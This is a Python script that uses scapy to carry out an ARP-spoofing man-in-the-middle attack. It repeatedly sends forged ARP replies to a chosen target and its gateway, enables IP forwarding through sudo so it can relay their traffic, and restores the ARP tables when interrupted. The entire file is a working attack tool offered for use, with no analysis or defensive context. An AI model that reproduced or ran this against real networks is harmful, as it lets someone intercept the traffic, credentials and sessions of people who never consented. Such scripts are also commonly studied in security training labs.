#!/usr/bin/env python
import time
import scapy.all as scapy
import argparse
import subprocess
from colorama import Fore, Style

# Get arguments + options from the user
def get_args():
    parser = argparse.ArgumentParser() # Creating parser objects
    parser.description = "A python program to do a MITM attack. It will spoof your target and the GW associated to your target!"
    parser.add_argument("-t", "--target", dest="target", help="Target IP to spoof") # Adding target IP options to the parser object
    parser.add_argument("-gw", "--gateway", dest="gateway", help="Target Gateway to spoof") # Adding target GW options to the parser object
    options =  parser.parse_args() # Returning Options & Arguments

    # Verifying for user input
    if not options.target:
        # Handle error
        parser.error(Fore.RED + "[-] Please enter a target IP to spoof, use -h for more info [-]")
    elif not options.gateway:
        # Handle error
        parser.error(Fore.RED + "[-] Please enter a gateway IP to spoof, use -h for more info [-]")
    else:
        return options # Returning the options and arguments from the parser

# Creating and sending the ARP scan packet
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast/arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] 
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(Fore.RED + f"[-] Unable to get MAC address for {ip}.")
        return None

# Creating and sending a fake ARP Packet
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip) # Grabbing the MAC from the victim
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # Crafting the ARP Packet
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def start(target_ip, gw_ip):
    sent_packet_count = 0
    try:
        # Enable IP forwarding
        subprocess.call("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True)
        while True:
            spoof(target_ip, gw_ip)
            spoof(gw_ip, target_ip)
            print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + f"\r[+] Sent {sent_packet_count} Packets [+]", end="")
        
            sent_packet_count += 2
            time.sleep(2)
    except KeyboardInterrupt:
        print(Fore.LIGHTGREEN_EX + "\n[+] Quitting and restoring ARP tables. [+]")
        restore(target_ip, gw_ip)
        restore(gw_ip, target_ip)
        # Enable IP forwarding
        subprocess.call("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True)


if __name__ == "__main__":       
    options = get_args()
    
    start(options.target, options.gateway)
